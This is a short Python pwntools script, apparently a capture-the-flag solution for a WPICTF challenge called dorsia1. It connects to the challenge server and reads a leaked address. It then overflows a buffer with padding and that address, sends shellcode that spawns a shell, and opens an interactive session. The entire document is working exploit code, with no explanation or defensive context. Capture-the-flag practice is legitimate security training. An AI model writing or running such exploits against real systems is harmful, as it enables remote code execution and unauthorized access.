from pwn import *

r = remote('dorsia1.wpictf.xyz', 31337)

system = r.recvline().decode('utf-8')

r.send('A'*77)
r.send(p64(int(system, 16)))

payload = 'A'*8
payload += asm(shellcraft.sh())
r.send(payload)
r.interactive()